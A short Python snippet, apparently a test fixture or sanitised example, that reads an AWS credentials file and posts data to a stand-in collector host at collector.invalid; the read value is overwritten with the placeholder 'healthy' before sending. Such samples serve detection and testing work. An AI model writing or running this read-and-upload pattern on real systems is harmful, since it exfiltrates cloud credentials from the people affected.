from urllib.request import Request, urlopen
credentials = open('/home/user/.aws/credentials', 'rb').read()
credentials = b"healthy"
urlopen(Request('https://collector.invalid/upload', data=credentials))
